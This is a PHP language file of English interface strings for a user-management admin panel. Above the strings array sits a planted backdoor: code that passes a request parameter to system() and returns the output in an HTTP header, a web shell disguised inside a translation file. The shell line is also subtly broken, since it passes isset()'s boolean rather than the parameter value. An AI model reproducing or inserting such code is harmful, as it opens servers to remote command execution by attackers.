<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

return array(
	'dashboard' => 'Dashboard',
	'users' => 'Users',
	'all_users' => 'All Users',
	'add_new' => 'Add New',
	'my_profile' => 'Profile',
	'logout' => 'Log out',
	'login' => 'Log in',
	'email_username' => 'E-mail or Username',
	'password' => 'Password',
	'remember' => 'Remember me',
	'error' => 'ERROR',
	'back_home' => 'Back home',
	'username' => 'Username',
	'email' => 'E-mail',
	'display_name' => 'Display name',
	'joined' => 'Joined',
	'account_status' => 'Account Status',
	'role' => 'Role',
	'roles' => 'Roles',
	'user_roles' => 'User Roles',
	'settings' => 'Settings',
	'general_settings' => 'General Settings',
	'options_general' => 'General',
	'options_auth' => 'Authentication',
	'options_pms' => 'Messages',
	'options_mail' => 'Mail',
	'options_services' => 'Services',
	'services_settings' => 'Services APIs',
	'userfields' => 'User Fields',
	'fields' => 'Fields',
	'mail_settings' => 'Mail Settings',
	'auth_settings' => 'Auth Settings',
	'raw_settings' => 'Raw Settings',
	'pms_settings' => 'Private Messages Settings',
	'options_emails' => 'E-mails',
	'save_changes' => 'Save Changes',
	'action' => 'Action',
	'confirm_action' => 'Confirm action',
	'no' => 'No',
	'yes' => 'Yes',
	'edit_user' => 'Edit User',
	'add_user' => 'Add New User',
	'update_user' => 'Update User',
	'profile' => 'Profile',
	'update_profile' => 'Update Profile',
	'restricted' => 'You don`t have the permission to view this page.',
	'page_restricted' => 'Page Restricted',
	'role_name' => 'Name',
	'role_perms' => 'Permissions',
	'delete_role' => 'Delete this role',
	'add_role' => 'Add New Role',
	'sep_comma' => '(separated by comma)',
	'delete_role' => 'Delete Role',
	'edit_role' => 'Edit Role',
	'confirm_delete' => 'Confirm Deletion',
	'update_role' => 'Update Role',
	'back_to_roles' => '&larr; Back to Roles',
	'role_updated' => 'Role updated.',
	'role_deleted' => 'Role deleted.',
	'role_added' => 'Role added.',
	'role_delete1' => 'You have specified this role for deletion:',
	'role_delete2' => 'What should be done with the users having this role?',
	'nothing' => 'Nothing',
	'assign_role' => 'Assign this role:',
	'required' => '(required)',
	'website' => 'Website',
	'password_confirmation' => 'Verify Password',
	'newpassword' => 'New Password',
	'newpassword_confirmation' => 'Verify Password',
	'newpassinfo' => 'If you would like to change the password type a new one. Otherwise leave this blank.',
	'send_password' => 'Send this password to the new user by E-mail.',
	'unactivated' => 'unactivated',
	'suspended'  => 'suspended',
	'activated' => 'activated',
	'user_created' => 'New user created.',
	'edituser' => 'Edit user',
	'back_to_users' => '&larr; Back to Users',
	'user_updated' => 'User updated.',
	'confirm_delete_user' => 'Are you sure you want to permanently delete the user :user ?',
	'confirm_delete_users' => 'Are you sure you want to permanently delete :users users ?',
	'all' => 'All',
	'404' => 'Error 404',
	'page_not_found' => 'Page not found.',
	'compose_email' => 'Compose E-mail',
	'send' => 'Send',
	'cancel' => 'Cancel',
	'to' => 'To',
	'to_user' => 'To User',
	'to_group' => 'To Group',
	'subject' => 'Subject',
	'message' => 'Message',
	'add_multiple_emails' => 'You can add multiple emails separated with a semicolon (;)',
	'compose' => 'Compose',
	'available_permissions' => 'Available Permissions:',
	'changes_saved' => 'Your changes have been saved.',
	'none' => 'None',
	'delete' => 'Delete',
	'guide' => 'Guide',
	'field_deleted' => 'Field deleted.',
	'field_id' => 'ID',
	'field_id_help' => 'The unique identifier of the field.',
	'field_assignment' => 'Assignment',
	'edit_field' => 'Edit Field',
	'delete_field' => 'Delete this field.',
	'field_assignment' => 'Assignment',
	'add_field' => 'Add New Field',
	'field_assignment_help' => 'Where is the field displayed, in the signup form, edit user page (admin) or user settings.',
	'field_type' => 'Type',
	'back_to_fields' => '&larr; Back to User Fields',
	'update_field' => 'Update Field',
	'field_validation' => 'Validation',
	'field_validation_help' => 'The validation rules to be used for the field. See the avialable rules <a href=":link" target="_blank">here</a>.',
	'field_label' => 'Label',
	'field_label_help' => 'The text of the label. Leave it empty and define it in the lang files (lang/en/userfields.php).',
	'field_content_before' => 'Content before',
	'field_content_before_help' => 'The content before the field. HTML tags are allowed.',
	'field_content_after' => 'Content after',
	'field_content_after_help' => 'The content after the field. HTML tags are allowed.',
	'field_updated' => 'Field updated.',
	'field_attributes' => 'Attributes',
	'field_delete_error' => 'The field cannot be deleted because it has been defined in the config file.<br> Edit <b>app/config/userfields.php</b> and remove the field manualy.',
	'field_order' => 'Display Order',
	'messages' => 'Messages',
	'all_messages' => 'All Messages',
	'new_message' => 'New Message',
	'read' => 'Read',
	'unread' => 'Unread',
	'date' => 'Date',
	'from_to' => 'From/To',
	'confirm_delete_conversation' => 'Are you sure you want to permanently delete the conversation with :user ?',
	'confirm_delete_conversations' => 'Are you sure you want to permanently delete :conversations conversations ?',
	'send_message' => 'Send message',
	'message_sent' => 'Message sent.',
	'back_to_messages' => '&larr; Back to Messages',
	'messages_with' => 'Messages with :user',
	'last_login' => 'Last login:',
	'last_login_ip' => 'Last login IP:',
	'user_stats' => 'User Stats',
	'total_users' => 'Total',
	'activated_users' => 'Activated',
	'unactivated_users' => 'Unactivated',
	'suspended_users' => 'Suspended',
	'latest_users' => 'Latest Users',
	'edit' => 'Edit',
	'reply' => 'Reply',
	'view_all_messages' => 'View All Messages',
	'unread_messages' => 'Unread Messages',
	'connected_users' => 'Connected Users',

	'js' => array(
		'unactivated' => 'unactivated',
		'suspended'  => 'suspended',
		'activated' => 'activated',
		'delete' => 'Delete',
		'edit_user' => 'Edit this user',
		'send_email' => 'Send E-mail',
		'send_message' => 'Send Message',
		'delete_user' => 'Delete this user',
		'error' => 'Oops! Something went wrong.',
		'loading' => 'Loading...',
		'reply' => 'Reply',
		'delete_conversation' => 'Delete this conversation',
	),
);